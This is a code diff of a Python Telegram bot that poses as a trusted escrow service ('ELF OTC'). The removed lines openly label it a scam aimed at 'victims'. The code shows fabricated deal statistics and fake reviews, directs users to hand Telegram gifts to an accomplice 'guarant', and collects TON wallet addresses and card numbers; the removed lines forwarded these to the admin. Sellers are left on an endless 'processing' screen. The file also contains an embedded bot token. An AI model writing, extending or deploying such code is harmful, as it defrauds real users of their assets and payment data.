@@ -6,26 +6,26 @@ import sqlite3
 from datetime import datetime
 from aiogram import Bot, Dispatcher, types
 from aiogram.utils import executor
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
 from aiogram.dispatcher import FSMContext
 from aiogram.dispatcher.filters.state import State, StatesGroup
 from aiogram.contrib.fsm_storage.memory import MemoryStorage
 
 # ================== КОНФИГУРАЦИЯ ==================
 BOT_TOKEN = "8477920514:AAFL7om34i_6NeLByv0LrydZOjiG2N9VV4o"  # Замени на свой
-ADMIN_IDS = [8146320391]  # Твой Telegram ID
+ADMIN_IDS = [8701154933]  # Твой Telegram ID
 
-# Фейковые данные для сбора
-FAKE_WALLET = "UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-FAKE_CARD = "4400 4303 3902 3597"
+# Гарант для передачи подарка (твой сообщник)
+GIFT_GUARANT = "@otc_elff"
 
-# Юзер для передачи подарка (твой сообщник или фейк)
-GIFT_RECEIVER = "@otc_elff"
+# Канал с инструкцией
+TUTORIAL_CHANNEL = "https://t.me/otcelftutorial/2"
 
 # Валюты
 CURRENCIES = {
-    "STARS": "⭐ Telegram Stars",
     "TON": "💎 TON",
+    "NOT": "⚡ NOT",
+    "STARS": "⭐ Telegram Stars",
     "RUB": "₽ Рубли",
     "KZT": "₸ Тенге",
     "USD": "$ Доллары"
@@ -37,30 +37,40 @@ logger = logging.getLogger(__name__)
 
 # ================== БАЗА ДАННЫХ ==================
 def init_db():
-    conn = sqlite3.connect('scam_garant.db')
+    conn = sqlite3.connect('elf_otc.db')
     c = conn.cursor()
     
-    # Пользователи
+    # Пользователи (ВСЕ кто нажал старт сохраняются)
     c.execute('''CREATE TABLE IF NOT EXISTS users
                  (user_id INTEGER PRIMARY KEY,
                   username TEXT,
                   first_name TEXT,
+                  reg_date TEXT,
+                  last_activity TEXT,
+                  referrer_id INTEGER DEFAULT 0,
+                  referral_balance REAL DEFAULT 0,
+                  total_deals INTEGER DEFAULT 0)''')
+    
+    # Кошельки пользователей
+    c.execute('''CREATE TABLE IF NOT EXISTS wallets
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                  user_id INTEGER,
+                  wallet_type TEXT,
                   wallet_address TEXT,
-                  card_number TEXT,
-                  registered_at TEXT)''')
+                  added_date TEXT)''')
     
     # Сделки
     c.execute('''CREATE TABLE IF NOT EXISTS deals
                  (deal_id TEXT PRIMARY KEY,
                   seller_id INTEGER,
                   buyer_id INTEGER,
+                  item TEXT,
                   amount REAL,
                   currency TEXT,
-                  status TEXT DEFAULT 'waiting_buyer',
+                  status TEXT DEFAULT 'waiting_item',
                   created_at TEXT,
-                  completed_at TEXT,
-                  seller_confirmed INTEGER DEFAULT 0,
-                  buyer_confirmed INTEGER DEFAULT 0)''')
+                  item_received INTEGER DEFAULT 0,
+                  payment_requested INTEGER DEFAULT 0)''')
     
     # Админы
     c.execute('''CREATE TABLE IF NOT EXISTS admins
@@ -68,12 +78,12 @@ def init_db():
                   added_by INTEGER,
                   added_at TEXT)''')
     
-    # Статистика (фейковая)
-    c.execute('''CREATE TABLE IF NOT EXISTS stats
+    # Статистика (фейковая для показа)
+    c.execute('''CREATE TABLE IF NOT EXISTS fake_stats
                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
-                  total_deals INTEGER DEFAULT 1547,
-                  total_users INTEGER DEFAULT 2341,
-                  total_volume REAL DEFAULT 45890.5)''')
+                  total_deals INTEGER DEFAULT 15470,
+                  total_users INTEGER DEFAULT 8920,
+                  total_volume REAL DEFAULT 1250000)''')
     
     # Добавляем первого админа
     try:
@@ -83,21 +93,25 @@ def init_db():
     except:
         pass
     
+    # Добавляем начальную фейк статистику если нет
+    c.execute('SELECT COUNT(*) FROM fake_stats')
+    if c.fetchone()[0] == 0:
+        c.execute('INSERT INTO fake_stats (total_deals, total_users, total_volume) VALUES (15470, 8920, 1250000)')
+    
     conn.commit()
     conn.close()
 
 init_db()
 
 # ================== СОСТОЯНИЯ FSM ==================
+class WalletStates(StatesGroup):
+    waiting_for_wallet_address = State()
+    waiting_for_wallet_type = State()
+
 class DealStates(StatesGroup):
+    waiting_for_item = State()
     waiting_for_amount = State()
     waiting_for_currency = State()
-    waiting_for_wallet = State()
-    waiting_for_card = State()
-
-class AdminStates(StatesGroup):
-    waiting_for_new_admin = State()
-    waiting_for_stats_value = State()
 
 # ================== ИНИЦИАЛИЗАЦИЯ ==================
 bot = Bot(token=BOT_TOKEN, parse_mode="HTML")
@@ -107,58 +121,96 @@ dp = Dispatcher(bot, storage=storage)
 # ================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==================
 def generate_deal_id():
     """Генерация ID сделки"""
-    return 'DEAL-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
+    return 'ELF-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
 
 def is_admin(user_id):
     """Проверка на админа"""
-    conn = sqlite3.connect('scam_garant.db')
+    conn = sqlite3.connect('elf_otc.db')
     c = conn.cursor()
     c.execute('SELECT user_id FROM admins WHERE user_id = ?', (user_id,))
     result = c.fetchone()
     conn.close()
     return result is not None
 
-def add_user(user_id, username, first_name):
-    """Добавление пользователя"""
-    conn = sqlite3.connect('scam_garant.db')
+def save_user(user_id, username, first_name, referrer_id=0):
+    """Сохранение пользователя в БД (каждый кто нажал старт)"""
+    conn = sqlite3.connect('elf_otc.db')
     c = conn.cursor()
-    c.execute('''INSERT OR IGNORE INTO users (user_id, username, first_name, registered_at)
+    
+    # Проверяем есть ли уже
+    c.execute('SELECT user_id FROM users WHERE user_id = ?', (user_id,))
+    exists = c.fetchone()
+    
+    now = datetime.now().isoformat()
+    
+    if exists:
+        # Обновляем последнюю активность
+        c.execute('UPDATE users SET last_activity = ?, username = ?, first_name = ? WHERE user_id = ?',
+                  (now, username, first_name, user_id))
+    else:
+        # Новый пользователь
+        c.execute('''INSERT INTO users (user_id, username, first_name, reg_date, last_activity, referrer_id)
+                     VALUES (?, ?, ?, ?, ?, ?)''',
+                  (user_id, username, first_name, now, now, referrer_id))
+        
+        # Если есть реферер, начисляем бонус
+        if referrer_id > 0:
+            c.execute('UPDATE users SET referral_balance = referral_balance + 5 WHERE user_id = ?', (referrer_id,))
+    
+    conn.commit()
+    conn.close()
+
+def get_user(user_id):
+    """Получение пользователя"""
+    conn = sqlite3.connect('elf_otc.db')
+    c = conn.cursor()
+    c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
+    user = c.fetchone()
+    conn.close()
+    return user
+
+def add_wallet(user_id, wallet_type, wallet_address):
+    """Добавление кошелька"""
+    conn = sqlite3.connect('elf_otc.db')
+    c = conn.cursor()
+    c.execute('''INSERT INTO wallets (user_id, wallet_type, wallet_address, added_date)
                  VALUES (?, ?, ?, ?)''',
-              (user_id, username, first_name, datetime.now().isoformat()))
+              (user_id, wallet_type, wallet_address, datetime.now().isoformat()))
     conn.commit()
     conn.close()
 
-def update_user_wallet(user_id, wallet):
-    """Обновление кошелька пользователя"""
-    conn = sqlite3.connect('scam_garant.db')
+def get_wallets(user_id):
+    """Получение всех кошельков пользователя"""
+    conn = sqlite3.connect('elf_otc.db')
     c = conn.cursor()
-    c.execute('UPDATE users SET wallet_address = ? WHERE user_id = ?', (wallet, user_id))
-    conn.commit()
+    c.execute('SELECT wallet_type, wallet_address FROM wallets WHERE user_id = ?', (user_id,))
+    wallets = c.fetchall()
     conn.close()
+    return wallets
 
-def update_user_card(user_id, card):
-    """Обновление карты пользователя"""
-    conn = sqlite3.connect('scam_garant.db')
+def delete_wallet(user_id, wallet_address):
+    """Удаление кошелька"""
+    conn = sqlite3.connect('elf_otc.db')
     c = conn.cursor()
-    c.execute('UPDATE users SET card_number = ? WHERE user_id = ?', (card, user_id))
+    c.execute('DELETE FROM wallets WHERE user_id = ? AND wallet_address = ?', (user_id, wallet_address))
     conn.commit()
     conn.close()
 
-def create_deal(seller_id, amount, currency):
+def create_deal(seller_id, item, amount, currency):
     """Создание сделки (продавец)"""
     deal_id = generate_deal_id()
-    conn = sqlite3.connect('scam_garant.db')
+    conn = sqlite3.connect('elf_otc.db')
     c = conn.cursor()
-    c.execute('''INSERT INTO deals (deal_id, seller_id, amount, currency, created_at)
-                 VALUES (?, ?, ?, ?, ?)''',
-              (deal_id, seller_id, amount, currency, datetime.now().isoformat()))
+    c.execute('''INSERT INTO deals (deal_id, seller_id, item, amount, currency, created_at)
+                 VALUES (?, ?, ?, ?, ?, ?)''',
+              (deal_id, seller_id, item, amount, currency, datetime.now().isoformat()))
     conn.commit()
     conn.close()
     return deal_id
 
 def get_deal(deal_id):
     """Получение сделки по ID"""
-    conn = sqlite3.connect('scam_garant.db')
+    conn = sqlite3.connect('elf_otc.db')
     c = conn.cursor()
     c.execute('SELECT * FROM deals WHERE deal_id = ?', (deal_id,))
     deal = c.fetchone()
@@ -167,148 +219,152 @@ def get_deal(deal_id):
 
 def update_deal_buyer(deal_id, buyer_id):
     """Обновление покупателя в сделке"""
-    conn = sqlite3.connect('scam_garant.db')
+    conn = sqlite3.connect('elf_otc.db')
     c = conn.cursor()
-    c.execute('UPDATE deals SET buyer_id = ?, status = "waiting_payment" WHERE deal_id = ?',
+    c.execute('UPDATE deals SET buyer_id = ?, status = "waiting_item" WHERE deal_id = ?',
               (buyer_id, deal_id))
     conn.commit()
     conn.close()
 
-def update_deal_status(deal_id, status):
-    """Обновление статуса сделки"""
-    conn = sqlite3.connect('scam_garant.db')
+def update_deal_item_received(deal_id):
+    """Подтверждение получения товара гарантом"""
+    conn = sqlite3.connect('elf_otc.db')
     c = conn.cursor()
-    c.execute('UPDATE deals SET status = ? WHERE deal_id = ?', (status, deal_id))
-    conn.commit()
-    conn.close()
-
-def confirm_seller(deal_id):
-    """Продавец подтверждает получение оплаты"""
-    conn = sqlite3.connect('scam_garant.db')
-    c = conn.cursor()
-    c.execute('UPDATE deals SET seller_confirmed = 1, status = "item_transfer" WHERE deal_id = ?',
+    c.execute('UPDATE deals SET item_received = 1, status = "item_received" WHERE deal_id = ?',
               (deal_id,))
     conn.commit()
     conn.close()
 
-def confirm_buyer_received(deal_id):
-    """Покупатель подтверждает получение подарка"""
-    conn = sqlite3.connect('scam_garant.db')
+def update_deal_payment_requested(deal_id):
+    """Продавец запросил выплату"""
+    conn = sqlite3.connect('elf_otc.db')
     c = conn.cursor()
-    c.execute('''UPDATE deals SET buyer_confirmed = 1, status = "completed", completed_at = ? 
-                 WHERE deal_id = ?''',
-              (datetime.now().isoformat(), deal_id))
+    c.execute('UPDATE deals SET payment_requested = 1, status = "processing" WHERE deal_id = ?',
+              (deal_id,))
     conn.commit()
     conn.close()
 
-def get_stats():
-    """Получение фейковой статистики"""
-    conn = sqlite3.connect('scam_garant.db')
+def get_fake_stats():
+    """Получение фейковой статистики для показа"""
+    conn = sqlite3.connect('elf_otc.db')
     c = conn.cursor()
-    c.execute('SELECT total_deals, total_users, total_volume FROM stats ORDER BY id DESC LIMIT 1')
+    c.execute('SELECT total_deals, total_users, total_volume FROM fake_stats ORDER BY id DESC LIMIT 1')
     stats = c.fetchone()
     conn.close()
-    
-    if stats:
-        return stats
-    return (1547, 2341, 45890.5)
+    return stats if stats else (15470, 8920, 1250000)
 
-def update_stats(deals=None, users=None, volume=None):
-    """Обновление статистики (админка)"""
-    conn = sqlite3.connect('scam_garant.db')
+def get_real_stats():
+    """Реальная статистика для админа"""
+    conn = sqlite3.connect('elf_otc.db')
     c = conn.cursor()
-    current = get_stats()
     
-    new_deals = deals if deals is not None else current[0]
-    new_users = users if users is not None else current[1]
-    new_volume = volume if volume is not None else current[2]
+    total_users = c.execute('SELECT COUNT(*) FROM users').fetchone()[0]
+    total_deals = c.execute('SELECT COUNT(*) FROM deals').fetchone()[0]
+    active_deals = c.execute('SELECT COUNT(*) FROM deals WHERE status != "completed"').fetchone()[0]
     
-    c.execute('INSERT INTO stats (total_deals, total_users, total_volume) VALUES (?, ?, ?)',
-              (new_deals, new_users, new_volume))
-    conn.commit()
+    # Сколько сегодня зарегистрировалось
+    today = c.execute('''SELECT COUNT(*) FROM users 
+                         WHERE date(reg_date) = date('now')''').fetchone()[0]
+    
     conn.close()
+    
+    return total_users, total_deals, active_deals, today
 
 # ================== КЛАВИАТУРЫ ==================
-def main_keyboard(user_id):
-    """Основная клавиатура"""
-    keyboard = InlineKeyboardMarkup(row_width=2)
+def main_keyboard():
+    """Основная клавиатура (как на скрине)"""
+    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
     keyboard.add(
-        InlineKeyboardButton("💰 Продать (создать сделку)", callback_data="sell"),
-        InlineKeyboardButton("🛒 Купить (войти в сделку)", callback_data="buy")
+        KeyboardButton("💳 Добавить/изменить кошелёк"),
+        KeyboardButton("📝 Создать сделку")
     )
     keyboard.add(
-        InlineKeyboardButton("👤 Мой профиль", callback_data="profile"),
-        InlineKeyboardButton("⭐ Отзывы", callback_data="reviews")
+        KeyboardButton("🔗 Реферальная ссылка"),
+        KeyboardButton("🌐 Change language")
     )
-    
-    if is_admin(user_id):
-        keyboard.add(InlineKeyboardButton("⚙️ Админ панель", callback_data="admin_panel"))
-    
+    keyboard.add(KeyboardButton("📞 Поддержка"))
     return keyboard
 
-def currency_keyboard():
+def wallets_keyboard(user_id):
+    """Клавиатура для управления кошельками"""
+    wallets = get_wallets(user_id)
+    keyboard = InlineKeyboardMarkup(row_width=1)
+    
+    if wallets:
+        for w in wallets:
+            keyboard.add(InlineKeyboardButton(
+                f"❌ {w[0]}: {w[1][:8]}...{w[1][-4:]}" if len(w[1]) > 12 else f"❌ {w[0]}: {w[1]}", 
+                callback_data=f"del_wallet_{w[1]}"
+            ))
+    
+    keyboard.add(
+        InlineKeyboardButton("➕ Добавить TON кошелек", callback_data="add_wallet_ton"),
+        InlineKeyboardButton("➕ Добавить карту", callback_data="add_wallet_card")
+    )
+    keyboard.add(InlineKeyboardButton("🔙 Главное меню", callback_data="back_to_menu"))
+    return keyboard
+
+def deal_currency_keyboard():
     """Выбор валюты"""
     keyboard = InlineKeyboardMarkup(row_width=2)
     buttons = []
     for code, name in CURRENCIES.items():
-        buttons.append(InlineKeyboardButton(name, callback_data=f"curr_{code}"))
+        buttons.append(InlineKeyboardButton(name, callback_data=f"deal_curr_{code}"))
     keyboard.add(*buttons)
+    keyboard.add(InlineKeyboardButton("🔙 Отмена", callback_data="back_to_menu"))
     return keyboard
 
-def deal_link_keyboard(deal_id):
-    """Кнопка со ссылкой на сделку"""
-    keyboard = InlineKeyboardMarkup()
-    # Ссылка будет сгенерирована в обработчике
-    return keyboard
-
-def payment_keyboard(deal_id):
-    """Кнопка оплаты для покупателя (мошенника)"""
-    keyboard = InlineKeyboardMarkup()
-    keyboard.add(InlineKeyboardButton("✅ Оплатить (фейк)", callback_data=f"pay_{deal_id}"))
+def buyer_deal_keyboard(deal_id):
+    """Кнопки для покупателя"""
+    keyboard = InlineKeyboardMarkup(row_width=1)
+    keyboard.add(InlineKeyboardButton(
+        "✅ Передать подарок гаранту", 
+        callback_data=f"give_item_{deal_id}"
+    ))
+    keyboard.add(InlineKeyboardButton("🔙 Отмена", callback_data="back_to_menu"))
     return keyboard
 
 def seller_confirm_keyboard(deal_id):
-    """Подтверждение от продавца (жертвы)"""
-    keyboard = InlineKeyboardMarkup()
-    keyboard.add(InlineKeyboardButton("✅ Я получил оплату", callback_data=f"seller_confirm_{deal_id}"))
+    """Кнопки для продавца после передачи"""
+    keyboard = InlineKeyboardMarkup(row_width=1)
+    keyboard.add(InlineKeyboardButton(
+        "💰 Принять деньги", 
+        callback_data=f"accept_money_{deal_id}"
+    ))
+    keyboard.add(InlineKeyboardButton("🔄 Проверить статус", callback_data=f"status_{deal_id}"))
     return keyboard
 
-def transfer_keyboard(deal_id):
-    """Подтверждение передачи подарка"""
-    keyboard = InlineKeyboardMarkup()
-    keyboard.add(InlineKeyboardButton("✅ Я передал подарок", callback_data=f"transfer_{deal_id}"))
+def loading_keyboard():
+    """Клавиатура с бесконечной загрузкой"""
+    keyboard = InlineKeyboardMarkup(row_width=1)
+    keyboard.add(InlineKeyboardButton(
+        "⏳ Обработка... (2-3 часа)", 
+        callback_data="loading_forever"
+    ))
     return keyboard
 
-def buyer_received_keyboard(deal_id):
-    """Покупатель подтверждает получение"""
+def back_to_menu_keyboard():
+    """Кнопка возврата в меню"""
     keyboard = InlineKeyboardMarkup()
-    keyboard.add(InlineKeyboardButton("✅ Я получил подарок", callback_data=f"receive_{deal_id}"))
-    return keyboard
-
-def admin_keyboard():
-    """Админ панель"""
-    keyboard = InlineKeyboardMarkup(row_width=2)
-    keyboard.add(
-        InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"),
-        InlineKeyboardButton("👥 Пользователи", callback_data="admin_users"),
-        InlineKeyboardButton("📈 Изменить статистику", callback_data="admin_edit_stats"),
-        InlineKeyboardButton("➕ Добавить админа", callback_data="admin_add"),
-        InlineKeyboardButton("🔙 Назад", callback_data="back_to_main")
-    )
+    keyboard.add(InlineKeyboardButton("🔙 Главное меню", callback_data="back_to_menu"))
     return keyboard
 
 # ================== ОБРАБОТЧИКИ ==================
 @dp.message_handler(commands=['start'])
 async def cmd_start(message: types.Message):
-    """Обработка /start"""
+    """Обработка /start - СОХРАНЯЕМ ВСЕХ"""
     user_id = message.from_user.id
     username = message.from_user.username or "нет"
     first_name = message.from_user.first_name or "Пользователь"
     
-    add_user(user_id, username, first_name)
-    
-    # Проверка на вход в сделку (покупатель)
+    # Проверка на реферальный параметр
     args = message.get_args()
+    referrer_id = int(args) if args and args.isdigit() else 0
+    
+    # СОХРАНЯЕМ ПОЛЬЗОВАТЕЛЯ (каждый кто нажал старт)
+    save_user(user_id, username, first_name, referrer_id)
+    
+    # Проверка на вход в сделку
     if args and args.startswith("deal_"):
         deal_id = args.replace("deal_", "")
         deal = get_deal(deal_id)
@@ -318,529 +374,459 @@ async def cmd_start(message: types.Message):
             
             await message.answer(
                 f"🔐 <b>Вход в сделку #{deal_id}</b>\n\n"
-                f"💰 Сумма: {deal[3]} {deal[4]}\n"
+                f"📦 {deal[3]}\n"
+                f"💰 {deal[4]} {deal[5]}\n"
                 f"👤 Продавец: ID {deal[1]}\n\n"
                 f"📋 <b>Инструкция:</b>\n"
-                f"1. Нажми кнопку оплаты ниже\n"
-                f"2. После подтверждения продавца получите подарок\n"
-                f"3. Подтвердите получение\n\n"
-                f"⚠️ Средства зарезервированы гарантом",
-                reply_markup=payment_keyboard(deal_id)
+                f"1. Передайте подарок гаранту {GIFT_GUARANT}\n"
+                f"2. Нажмите кнопку ниже\n"
+                f"3. Продавец подтвердит и вы получите товар",
+                reply_markup=buyer_deal_keyboard(deal_id)
             )
             return
     
-    # Обычный старт
-    total_deals, total_users, total_volume = get_stats()
+    # Фейковая статистика для показа
+    total_deals, total_users, total_volume = get_fake_stats()
     
-    await message.answer(
-        f"👋 <b>Добро пожаловать в OTC Гарант!</b>\n\n"
+    welcome_text = (
+        f"👋 <b>Добро пожаловать в ELF OTC – надежный P2P-гарант</b>\n\n"
+        f"💼 Покупайте и продавайте всё, что угодно – безопасно!\n"
+        f"От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n\n"
+        f"🔹 Удобное управление кошельками\n"
+        f"🔹 Реферальная система\n\n"
+        f"📖 <b>Как пользоваться?</b>\n"
+        f"Ознакомьтесь с инструкцией — {TUTORIAL_CHANNEL}\n\n"
         f"📊 <b>Статистика:</b>\n"
         f"✅ Сделок: {total_deals:,}\n"
         f"👥 Пользователей: {total_users:,}\n"
         f"💰 Объем: ${total_volume:,.0f}\n\n"
-        f"🔒 Безопасные сделки через гаранта\n"
-        f"⭐ Работаем с {', '.join(CURRENCIES.values())}",
-        reply_markup=main_keyboard(user_id)
-    )
-
-@dp.callback_query_handler(text="profile")
-async def show_profile(call: types.CallbackQuery):
-    """Профиль пользователя"""
-    user_id = call.from_user.id
-    
-    conn = sqlite3.connect('scam_garant.db')
-    c = conn.cursor()
-    c.execute('SELECT wallet_address, card_number FROM users WHERE user_id = ?', (user_id,))
-    user = c.fetchone()
-    c.execute('SELECT COUNT(*) FROM deals WHERE seller_id = ? OR buyer_id = ?', (user_id, user_id))
-    deals_count = c.fetchone()[0]
-    conn.close()
-    
-    wallet = user[0] if user and user[0] else "❌ Не добавлен"
-    card = user[1] if user and user[1] else "❌ Не добавлена"
-    
-    text = (
-        f"👤 <b>Ваш профиль</b>\n\n"
-        f"🆔 ID: <code>{user_id}</code>\n"
-        f"👤 Username: @{call.from_user.username or 'нет'}\n"
-        f"📊 Сделок: {deals_count}\n\n"
-        f"💳 <b>Платежные данные:</b>\n"
-        f"TON кошелек: <code>{wallet}</code>\n"
-        f"Карта: <code>{card}</code>\n\n"
-        f"✏️ Для изменения данных создайте сделку"
+        f"Выберите нужный раздел ниже:"
     )
     
-    await call.message.edit_text(text, reply_markup=main_keyboard(user_id))
+    await message.answer(welcome_text, reply_markup=main_keyboard())
 
-@dp.callback_query_handler(text="reviews")
-async def show_reviews(call: types.CallbackQuery):
-    """Фейковые отзывы"""
-    text = (
-        "⭐ <b>Отзывы наших клиентов</b>\n\n"
-        "@crypto_king: \"Продал подарок за 200 TON, деньги через 2 часа\" ★★★★★\n"
-        "@nft_lover: \"Лучший гарант, уже 5 сделок\" ★★★★★\n"
-        "@ton_trader: \"Быстро и надежно\" ★★★★★\n"
-        "@gift_seller: \"Спасибо, выручили\" ★★★★★\n"
-        "@whale_ton: \"Топ бот, всем советую\" ★★★★★\n\n"
-        "📈 <b>Всего отзывов:</b> 1,234\n"
-        "⭐ <b>Рейтинг:</b> 4.98/5"
-    )
+# ================== УПРАВЛЕНИЕ КОШЕЛЬКАМИ ==================
+@dp.message_handler(lambda message: message.text == "💳 Добавить/изменить кошелёк")
+async def wallets_menu(message: types.Message):
+    """Меню управления кошельками"""
+    user_id = message.from_user.id
+    wallets = get_wallets(user_id)
     
-    await call.message.edit_text(text, reply_markup=main_keyboard(call.from_user.id))
+    text = "💳 <b>Ваши кошельки</b>\n\n"
+    
+    if wallets:
+        for i, w in enumerate(wallets, 1):
+            text += f"{i}. {w[0]}: <code>{w[1]}</code>\n"
+    else:
+        text += "У вас пока нет сохраненных кошельков.\n\n"
+    
+    text += "\nВы можете добавить TON кошелек или банковскую карту для получения выплат."
+    
+    await message.answer(text, reply_markup=wallets_keyboard(user_id), parse_mode="HTML")
 
-@dp.callback_query_handler(text="sell")
-async def sell_start(call: types.CallbackQuery, state: FSMContext):
-    """Продажа - создание сделки (продавец - жертва)"""
+@dp.callback_query_handler(lambda c: c.data.startswith('add_wallet_'))
+async def add_wallet_start(call: types.CallbackQuery, state: FSMContext):
+    """Начало добавления кошелька"""
+    wallet_type = call.data.replace('add_wallet_', '')
+    
+    await state.update_data(wallet_type=wallet_type)
+    
+    type_names = {"ton": "TON кошелек", "card": "номер карты"}
+    
     await call.message.edit_text(
-        "💰 <b>Продажа подарка</b>\n\n"
-        "Введите сумму сделки в выбранной валюте:",
-        reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Отмена", callback_data="back_to_main"))
+        f"✏️ Введите {type_names.get(wallet_type, 'адрес')}:",
+        reply_markup=back_to_menu_keyboard()
+    )
+    await state.set_state(WalletStates.waiting_for_wallet_address)
+
+@dp.message_handler(state=WalletStates.waiting_for_wallet_address)
+async def process_wallet_address(message: types.Message, state: FSMContext):
+    """Обработка ввода адреса кошелька"""
+    address = message.text.strip()
+    data = await state.get_data()
+    wallet_type = data.get('wallet_type')
+    
+    type_names = {"ton": "TON", "card": "Card"}
+    display_type = type_names.get(wallet_type, wallet_type)
+    
+    add_wallet(message.from_user.id, display_type, address)
+    
+    await message.answer(
+        f"✅ {display_type} успешно добавлен!",
+        reply_markup=main_keyboard()
+    )
+    await state.finish()
+
+@dp.callback_query_handler(lambda c: c.data.startswith('del_wallet_'))
+async def delete_wallet_handler(call: types.CallbackQuery):
+    """Удаление кошелька"""
+    wallet_address = call.data.replace('del_wallet_', '')
+    delete_wallet(call.from_user.id, wallet_address)
+    
+    await call.answer("✅ Кошелек удален", show_alert=True)
+    await wallets_menu(call.message)
+
+# ================== СОЗДАНИЕ СДЕЛКИ ==================
+@dp.message_handler(lambda message: message.text == "📝 Создать сделку")
+async def create_deal_start(message: types.Message, state: FSMContext):
+    """Начало создания сделки"""
+    await message.answer(
+        "📦 <b>Что продаете?</b>\n\n"
+        "Опишите товар (например: Подарок Новогодний 2024):",
+        reply_markup=back_to_menu_keyboard()
+    )
+    await state.set_state(DealStates.waiting_for_item)
+
+@dp.message_handler(state=DealStates.waiting_for_item)
+async def process_deal_item(message: types.Message, state: FSMContext):
+    """Обработка описания товара"""
+    await state.update_data(item=message.text)
+    
+    await message.answer(
+        "💰 Введите сумму сделки (только число):",
+        reply_markup=back_to_menu_keyboard()
     )
     await state.set_state(DealStates.waiting_for_amount)
 
 @dp.message_handler(state=DealStates.waiting_for_amount)
-async def process_amount(message: types.Message, state: FSMContext):
+async def process_deal_amount(message: types.Message, state: FSMContext):
     """Обработка суммы"""
     try:
         amount = float(message.text.replace(',', '.'))
         if amount <= 0:
             raise ValueError
     except:
-        await message.answer("❌ Введите корректное число")
+        await message.answer("❌ Введите корректное число (например: 100)")
         return
     
     await state.update_data(amount=amount)
     
     await message.answer(
-        "💱 <b>Выберите валюту:</b>",
-        reply_markup=currency_keyboard()
+        "💱 Выберите валюту:",
+        reply_markup=deal_currency_keyboard()
     )
     await state.set_state(DealStates.waiting_for_currency)
 
-@dp.callback_query_handler(lambda c: c.data.startswith('curr_'), state=DealStates.waiting_for_currency)
-async def process_currency(call: types.CallbackQuery, state: FSMContext):
+@dp.callback_query_handler(lambda c: c.data.startswith('deal_curr_'), state=DealStates.waiting_for_currency)
+async def process_deal_currency(call: types.CallbackQuery, state: FSMContext):
     """Обработка валюты"""
-    currency = call.data.replace('curr_', '')
-    
-    await state.update_data(currency=currency)
-    
-    await call.message.edit_text(
-        f"💳 <b>Добавьте платежные данные</b>\n\n"
-        f"Для получения выплат укажите ваш TON кошелек:",
-        reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Отмена", callback_data="back_to_main"))
-    )
-    await state.set_state(DealStates.waiting_for_wallet)
-
-@dp.message_handler(state=DealStates.waiting_for_wallet)
-async def process_wallet(message: types.Message, state: FSMContext):
-    """Обработка кошелька"""
-    wallet = message.text.strip()
-    
-    await state.update_data(wallet=wallet)
-    
-    await message.answer(
-        "💳 <b>Добавьте номер карты</b>\n\n"
-        "Для вывода средств укажите карту:",
-        reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Отмена", callback_data="back_to_main"))
-    )
-    await state.set_state(DealStates.waiting_for_card)
-
-@dp.message_handler(state=DealStates.waiting_for_card)
-async def process_card(message: types.Message, state: FSMContext):
-    """Финальное создание сделки продавцом"""
-    card = message.text.strip()
+    currency = call.data.replace('deal_curr_', '')
     
     data = await state.get_data()
+    item = data['item']
     amount = data['amount']
-    currency = data['currency']
-    wallet = data['wallet']
-    
-    user_id = message.from_user.id
-    
-    # Сохраняем данные пользователя
-    update_user_wallet(user_id, wallet)
-    update_user_card(user_id, card)
     
     # Создаем сделку
-    deal_id = create_deal(user_id, amount, currency)
+    deal_id = create_deal(call.from_user.id, item, amount, currency)
     
-    # Отправляем админу уведомление (сбор данных)
-    await bot.send_message(
-        ADMIN_IDS[0],
-        f"💰 <b>НОВАЯ СДЕЛКА + ДАННЫЕ ЖЕРТВЫ</b>\n\n"
-        f"👤 Продавец: @{message.from_user.username}\n"
-        f"🆔 ID: {user_id}\n"
-        f"💎 TON: {wallet}\n"
-        f"💳 Карта: {card}\n"
-        f"📊 Сумма: {amount} {currency}\n"
-        f"🔗 Сделка: {deal_id}"
-    )
-    
-    # Создаем ссылку для покупателя (мошенника)
     bot_username = (await bot.me).username
     deal_link = f"https://t.me/{bot_username}?start=deal_{deal_id}"
     
-    await message.answer(
+    await call.message.edit_text(
         f"✅ <b>Сделка создана!</b>\n\n"
-        f"🔑 <b>ID сделки:</b> <code>{deal_id}</code>\n"
-        f"💰 <b>Сумма:</b> {amount} {currency}\n\n"
+        f"🔑 <b>ID:</b> <code>{deal_id}</code>\n"
+        f"📦 {item}\n"
+        f"💰 {amount} {currency}\n\n"
         f"📤 <b>Отправьте эту ссылку покупателю:</b>\n"
         f"{deal_link}\n\n"
-        f"<b>Как только покупатель оплатит, вы получите уведомление</b>",
-        reply_markup=main_keyboard(user_id)
+        f"⚠️ После того как покупатель передаст подарок гаранту {GIFT_GUARANT},\n"
+        f"вы получите уведомление.",
+        reply_markup=main_keyboard()
     )
     
     await state.finish()
 
-@dp.callback_query_handler(text="buy")
-async def buy_start(call: types.CallbackQuery):
-    """Покупка - вход в сделку (покупатель - мошенник)"""
-    await call.message.edit_text(
-        "🔐 <b>Вход в сделку</b>\n\n"
-        "Введите ID сделки, который отправил продавец:",
-        reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Отмена", callback_data="back_to_main"))
-    )
-
-# Этот хендлер уже есть в /start, но можно добавить обработчик для ручного ввода
-@dp.message_handler(lambda message: message.text and message.text.startswith('DEAL-'))
-async def manual_enter_deal(message: types.Message):
-    """Ручной ввод ID сделки"""
-    deal_id = message.text.strip()
+# ================== ПРОЦЕСС СДЕЛКИ ==================
+@dp.callback_query_handler(lambda c: c.data.startswith('give_item_'))
+async def give_item_to_guarant(call: types.CallbackQuery):
+    """Покупатель передал подарок гаранту"""
+    deal_id = call.data.replace('give_item_', '')
     deal = get_deal(deal_id)
     
